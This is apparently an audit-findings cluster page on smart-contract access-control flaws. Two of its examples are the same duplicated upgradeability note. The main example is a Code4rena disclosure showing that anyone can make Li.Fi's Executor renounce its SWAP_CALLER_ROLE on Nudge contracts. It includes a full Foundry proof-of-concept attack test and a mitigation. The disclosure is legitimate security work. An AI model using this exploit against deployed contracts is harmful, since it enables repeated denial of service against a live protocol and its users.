# Cluster -1326

**Rank:** #124  
**Count:** 126  

## Label
Failure to validate contract existence or caller identity during delegatecall enables arbitrary code execution, state manipulation, and unintended self-destruction, leading to loss of control and asset exposure.

## Cluster Information
- **Total Findings:** 126

## Examples

### Example 1

**Auto Label:** Failure to validate target contract existence or integrity during delegatecall or upgrade, enabling silent failures, unauthorized control, or malicious code execution.  

**Original Text Preview:**

The `CLGauge` contract is designed to be upgradeable but currently inherits from `ERC721Holder`. It should instead inherit from `ERC721HolderUpgradeable` to ensure compatibility with upgradeable patterns.

```solidity
contract CLGauge is
    ICLGauge,
    UUPSUpgradeable,
    Ownable2StepUpgradeable,
    ERC721Holder
{
```

Since `CLGauge` is intended to be an upgradeable contract, it is crucial to use the upgradeable version of the `ERC721Holder`, which is `ERC721HolderUpgradeable`.

---
### Example 2

**Auto Label:** Failure to validate target contract existence or integrity during delegatecall or upgrade, enabling silent failures, unauthorized control, or malicious code execution.  

**Original Text Preview:**

The `CLGauge` contract is designed to be upgradeable but currently inherits from `ERC721Holder`. It should instead inherit from `ERC721HolderUpgradeable` to ensure compatibility with upgradeable patterns.

```solidity
contract CLGauge is
    ICLGauge,
    UUPSUpgradeable,
    Ownable2StepUpgradeable,
    ERC721Holder
{
```

Since `CLGauge` is intended to be an upgradeable contract, it is crucial to use the upgradeable version of the `ERC721Holder`, which is `ERC721HolderUpgradeable`.

---
### Example 3

**Auto Label:** Failure to validate contract existence or caller identity during delegatecall enables arbitrary code execution, state manipulation, and unintended self-destruction, leading to loss of control and asset exposure.  

**Original Text Preview:**

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol# L164-L233>

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgePointsCampaigns.sol# L126-L178>

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaignFactory.sol# L4>

### Finding description and impact

Li.Fi’s Executor contract is granted `SWAP_CALLER_ROLE`. The function `handleReallocation` is used inside the protocol to notify about user’s reallocation and can only be called by address that has `SWAP_CALLER_ROLE`. The intention of the protocol is to use the executor’s functions so that executor swaps assets and then calls `handleReallocation` inside `NudgeCampaign` / `NudgePointsCampaign` contract.

However, the Executor contract that has as a `SWAP_CALLER_ROLE` can be used by anyone (its functions do not have access control restrictions which is expected), anyone can call function `swapAndExecute`. This means that **any user** can call the `swapAndExecute` function and instruct the `Executor` to call **arbitrary functions** on other contracts.

As a result, an attacker can use the `Executor` to call `renounceRole` on the `NudgeCampaignFactory` contract, causing the `Executor` to lose its `SWAP_CALLER_ROLE`. This leads to DOS of every next `handleReallocation` call from Executor. Admin has to `grantRole` again to Executor contract, but user can repeat the process of `renouncingRole` using Executor.

Executor function that can be called is [here](https://github.com/lifinance/contracts/blob/b8c966aad30407b3f579723847057729549fd353/src/Periphery/Executor.sol# L105-L126).

### Proof of Concept

In order to POC to work, we must copy and paste contracts related to Executor and ERC20Proxy (the contract used by Executor) from official Li Fi’s contract repository so that we can use Executor inside our tests.

I’ve put LiFi’s contracts inside campaign directory in new folders created by me; Errors, Helpers, Interfaces, Libraries and Periphery:
```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { NudgeCampaign } from "../campaign/NudgeCampaign.sol";
import { NudgeCampaignFactory } from "../campaign/NudgeCampaignFactory.sol";
import { INudgeCampaign, IBaseNudgeCampaign } from "../campaign/interfaces/INudgeCampaign.sol";
import "../mocks/TestERC20.sol";
import { console } from "forge-std/console.sol";
import { Executor } from "../campaign/Periphery/Executor.sol";
import { ERC20Proxy } from "../campaign/Periphery/ERC20Proxy.sol";
import { LibSwap } from "../campaign/Libraries/LibSwap.sol";
import { TestUSDC } from "../mocks/TestUSDC.sol";

contract TestDOSReallocation is Test {
  using Math for uint256;

  NudgeCampaign private campaign;
  NudgeCampaignFactory private factory;
  TestERC20 private targetToken;
  TestERC20 private rewardToken;

  address owner = address(1);
  address alice = address(11);
  address bob = address(12);
  address campaignAdmin = address(13);
  address nudgeAdmin = address(14);
  address treasury = address(15);
  address swapCaller = address(16);
  address operator = address(17);
  address alternativeWithdrawalAddress = address(18);
  bytes32 public constant SWAP_CALLER_ROLE = keccak256("SWAP_CALLER_ROLE");
  uint16 constant DEFAULT_FEE_BPS = 1000; // 10%
  uint32 constant HOLDING_PERIOD = 7 days;
  uint256 constant REWARD_PPQ = 2e13;
  uint256 constant INITIAL_FUNDING = 100_000e18;
  uint256 constant PPQ_DENOMINATOR = 1e15;
  address constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
  address badActor = address(0xBAD);
  Executor executor;
  address executorOwner = address(19);
  ERC20Proxy erc20Proxy;

  function setUp() public {
    vm.startPrank(owner);
    //deploy erc20 proxy which is part of Li Fi protocol
    erc20Proxy = new ERC20Proxy(owner);
    vm.stopPrank();
    // Deploy tokens
    targetToken = new TestERC20("Target Token", "TT");
    rewardToken = new TestERC20("Reward Token", "RT");

    //deploy executor which is part of li fi protocol
    executor = new Executor(address(erc20Proxy), executorOwner);
    swapCaller = address(executor);
    console.log(address(executor));

    // Deploy factory with roles
    factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, address(executor));

    vm.startPrank(owner);
    //set executor as authorized caller as in Li Fi protocol
    erc20Proxy.setAuthorizedCaller(address(executor), true);
    vm.stopPrank();

    // Fund test contract and approve factory
    rewardToken.mintTo(INITIAL_FUNDING, address(this));
    rewardToken.approve(address(factory), INITIAL_FUNDING);

    // Deploy and fund campaign
    campaign = NudgeCampaign(
      payable(
        factory.deployAndFundCampaign(
          HOLDING_PERIOD,
          address(targetToken),
          address(rewardToken),
          REWARD_PPQ,
          campaignAdmin,
          0, // start immediately
          alternativeWithdrawalAddress,
          INITIAL_FUNDING,
          1 // uuid
        )
      )
    );

    // Setup swapCaller
    deal(address(targetToken), swapCaller, INITIAL_FUNDING);
    vm.prank(swapCaller);
    targetToken.approve(address(campaign), type(uint256).max);
  }

  function test_DOSReallocation() public {
    vm.deal(badActor, 10 ether);
    vm.startPrank(badActor);

    //deploy test usdc contract - this can be custom contract deployed by the attacker
    TestUSDC testUsdc = new TestUSDC("A", "B");

    testUsdc.mintTo(1 ether, badActor);
    testUsdc.approve(address(executor), 1);
    testUsdc.approve(address(erc20Proxy), 1);

    bytes memory renounceRoleCallData =
      abi.encodeWithSignature("renounceRole(bytes32,address)", SWAP_CALLER_ROLE, address(executor));

    LibSwap.SwapData memory sd1 = LibSwap.SwapData(
      //callTo:
      address(factory),
      //approveTo:
      address(testUsdc),
      //sendingAssetId:
      address(testUsdc),
      //receivingAssetId:
      address(testUsdc),
      //fromAmount:
      1,
      //callData:
      renounceRoleCallData,
      //requiresDeposit:
      false
    );

    LibSwap.SwapData[] memory swapDataArray = new LibSwap.SwapData[](1);
    swapDataArray[0] = sd1;

    bytes32 transactionId = bytes32(uint256(1));
    address transferredAssetId = address(testUsdc);
    address receiver = address(badActor);
    uint256 amount = 1;
    //attacker orders executor to execute renounceRole function on factory contract, leading to loss of role for executor
    // all of the future handleReallocations will revert, unless Nudge Admin will grant SWAP_CALLER_ROLE to executor
    //but the attacker can repeat this process indefinitely
    executor.swapAndExecute(transactionId, swapDataArray, address(testUsdc), payable(receiver), amount);
    vm.stopPrank();

    assert(!factory.hasRole(SWAP_CALLER_ROLE, address(executor)));
  }
}
```

### Recommended mitigation steps

Disallow `Executor` to renounce their role, or store executor as address and only verify that `msg.sender` is executor; which would make it impossible to renounce the role from the executor.

**raphael (Nudge.xyz) confirmed**

---

---
